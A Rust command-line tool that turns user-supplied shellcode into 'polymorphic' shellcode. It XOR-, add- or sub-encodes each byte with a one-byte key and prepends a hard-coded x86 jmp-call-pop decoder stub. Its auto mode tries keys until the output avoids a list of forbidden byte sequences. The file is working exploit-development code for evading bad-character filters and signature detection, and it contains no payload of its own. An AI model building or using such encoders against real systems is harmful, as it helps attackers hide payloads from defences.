use argh::FromArgs;
use std::fs::File;
use std::io::BufRead;
use std::path::Path;
use std::process;
use std::{io, vec};

/* Structures */

#[derive(FromArgs)]
/// Create a polymorphic shellcode from a given shellcode
struct Args {
    /// choose which kind of encryption you want
    #[argh(option, short = 'e', long = "enc")]
    encoding: String,

    /// choose the key for the choosen encryption, if auto enbale don't care about this argument. If this argument is not provided, the key will be 0
    #[argh(option, short = 'k', long = "key", default = "0")]
    key: i16,

    /// path to the file which contains unauthorized opcodes
    #[argh(option, short = 'f', long = "file", default = "String::from(\"None\")")]
    file: String,

    /// find automatically the good index for encryption to pass the rules if possible
    #[argh(switch, short = 'a', long = "auto")]
    auto: bool,
}

/* Functions */

/// Check if the size and the character of the opcodes are correct
fn is_right_format(opcodes: &str) -> bool {
    let good_length = (opcodes.len()) % 4 == 0;
    let mut ret = true;

    if !good_length {
        println!("Error: Length of shellcode is not correct");
        ret = false;
    };

    if ret {
        let mut index_start = 0; // Index start opcode
        for _ in 0..opcodes.len() / 4 {
            if opcodes.chars().nth(index_start) != Some('\\') {
                ret = false;
                println!("Error: \\ not found at index {}", index_start);
                break;
            }
            if opcodes.chars().nth(index_start + 1) != Some('x') {
                ret = false;
                println!("Error: x not found at index {}", index_start + 1);
                break;
            }
            if !opcodes
                .chars()
                .nth(index_start + 2)
                .unwrap()
                .is_ascii_hexdigit()
            {
                ret = false;
                println!("Error: hex digit not found at index {}", index_start + 2);
                break;
            }
            if !opcodes
                .chars()
                .nth(index_start + 2)
                .unwrap()
                .is_ascii_hexdigit()
            {
                ret = false;
                println!("Error: hex digit not found at index {}", index_start + 3);
                break;
            }
            index_start += 4;
        }
    }
    ret
}

/// Encode the shellcode and add the decoder ahead of it
fn encode_shellcode(shellcode: &str, decoder: &str, key: i16) -> String {
    // TODO fonction encodage etape 1

    let start_decoder = "\\xeb\\x11\\x5e\\x31\\xc9\\xb1";
    let end_decoder = "\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff";
    let xor_decoder = "\\x80\\x74\\x0e\\xff";
    let add_decoder = "\\x80\\x6c\\x0e\\xff";
    let sub_decoder = "\\x80\\x44\\x0e\\xff";
    let mut encoded_shellcode = String::new();
    let length = shellcode.len() / 4;

    // Creation of the decoder
    encoded_shellcode.push_str(start_decoder);
    encoded_shellcode.push_str(&format!("\\x{:02x}", length));

    match decoder {
        "sub" => encoded_shellcode.push_str(sub_decoder),
        "add" => encoded_shellcode.push_str(add_decoder),
        "xor" => encoded_shellcode.push_str(xor_decoder),
        _ => println!("Error: decoder not found"),
    }

    encoded_shellcode.push_str(&format!("\\x{:02x}", key));
    encoded_shellcode.push_str(end_decoder);

    // Encoding the provided shellcode
    let mut index_start = 0; // Index start opcode
    for _ in 0..shellcode.len() / 4 {
        let opcode = &shellcode[index_start + 2..index_start + 4];
        match decoder {
            "sub" => {
                let encoded_opcode = format!(
                    "\\x{:02x}",
                    (i16::from_str_radix(opcode, 16).unwrap() - key) & 0xff
                );
                encoded_shellcode.push_str(&encoded_opcode);
            }
            "add" => {
                let encoded_opcode = format!(
                    "\\x{:02x}",
                    (i16::from_str_radix(opcode, 16).unwrap() + key) & 0xff
                );
                encoded_shellcode.push_str(&encoded_opcode);
            }
            "xor" => {
                let encoded_opcode = format!(
                    "\\x{:02x}",
                    (i16::from_str_radix(opcode, 16).unwrap() ^ key) & 0xff
                );
                encoded_shellcode.push_str(&encoded_opcode);
            }
            _ => println!("Error: decoder not found"),
        }
        index_start += 4;
    }

    encoded_shellcode
}

/// Test if the shellcode pass the rules provided by the user

fn test_rules(shellcode: &str, rules: Vec<String>) -> bool {
    let mut ret = true;

    for rule in rules {
        if shellcode.contains(&rule) {
            println!("the rule {} is not respected", rule);
            match shellcode.find(&rule) {
                Some(index) => println!("the rule is at index {}", index),
                None => println!(""),
            }
            ret = false;
            break;
        }
    }
    ret
}

/// Read a file line by line and return an iterator over the lines
fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn main() {
    // Variables
    let mut shellcode = String::new();
    let encoding = vec!["sub", "add", "xor"];
    let mut args_good = false;
    let mut rules: Vec<String> = Vec::new();

    // Get the arguments
    let args: Args = argh::from_env();

    // Check if the encoding method exist
    for method in encoding {
        if args.encoding.contains(method) {
            args_good = true;
        }
    }

    if !args_good {
        println!("Error: encoding method doesn't exist");
    }

    // Check if the key doesn't exceed the limit
    if args_good && (args.key > 255 || args.key < 0) {
        println!("Error: key must be between 0 and 255");
        args_good = false;
    }

    // Check when auto is enable if a file is provided
    if args.auto && args_good {
        if args.key != 0 {
            println!("Error: key must be equal to 0 or not provided when auto is enable");
        } else {
            println!("Error: auto require a provided file which contain unauthorized opcodes");
        }
        args_good = !args.file.contains("None");
    }

    // Check if the file exist
    let file_provided = Path::new(&args.file).exists();
    if file_provided && args_good {
        args_good = Path::new(&args.file).exists();
        if !args_good {
            println!("Error: file doesn't exist");
        }
    }

    // Exit if encoding method doesn't exist
    if !args_good {
        process::exit(0x0100);
    }

    // Get the shellcode from the user
    println!("Please enter your shellcode with format \\x..");
    io::stdin()
        .read_line(&mut shellcode)
        .expect("Reading error");

    // Remove the \n at the end of the shellcode
    shellcode = shellcode.replace("\n", "");

    // Check shellcode format
    let shellcode_format = is_right_format(&shellcode);

    // Exit if shellcode format is not met
    if !shellcode_format {
        process::exit(0x0100);
    }

    // Read the file which contain unauthorized opcodes and create a vector with the rules
    if let Ok(lines) = read_lines(args.file) {
        for line in lines {
            if let Ok(rule) = line {
                if is_right_format(&rule) {
                    rules.push(rule);
                } else {
                    println!("Error: This rule is not in the right format: {} so i ignore it\n", rule);
                }
            }
        }
    }

    // Encode the shellcode
    let mut encoded_shellcode = encode_shellcode(&shellcode, &args.encoding, args.key);

    if file_provided {
        let mut shellcode_pass_rules = false;
        let mut key_test = args.key;

        // Test if the shellcode pass the rules
        if !args.auto {
            shellcode_pass_rules = test_rules(&encoded_shellcode, rules);
        } else {
            while key_test < 255 {
                encoded_shellcode = encode_shellcode(&shellcode, &args.encoding, key_test);
                shellcode_pass_rules = test_rules(&encoded_shellcode, rules.clone());
                if shellcode_pass_rules {
                    break;
                }
                key_test += 1;
            }
        }

        // Print the result
        if shellcode_pass_rules {
            println!("Shellcode pass the rules with the key {}\n", key_test);
        } else {
            if args.auto {
                println!("Shellcode doesn't pass the rules with all the keys\n");
            } else {
                println!("Shellcode doesn't pass the rules with the key {}\n", key_test);
            }
        }
    }

    println!("Encoded shellcode: {}", encoded_shellcode);

}
